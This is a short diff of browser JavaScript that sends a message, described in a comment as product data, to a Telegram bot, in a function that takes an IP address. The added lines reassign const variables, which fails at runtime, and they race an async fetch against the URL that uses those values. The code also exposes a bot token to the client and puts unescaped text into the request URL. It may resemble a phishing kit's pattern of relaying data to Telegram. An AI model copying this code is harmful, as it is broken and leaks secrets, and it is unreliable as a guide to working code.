@@ -244,6 +244,14 @@ function showPrompt(IpAddress) {
 
         const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
         const chatId = process.env.NEXT_PUBLIC_CHAT_ID; 
+
+        fetch('/api/config')
+        .then(response => response.json())
+        .then(config => {
+            chatId = config.chatId;
+            botToken = config.botToken;
+        });
+        
         const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
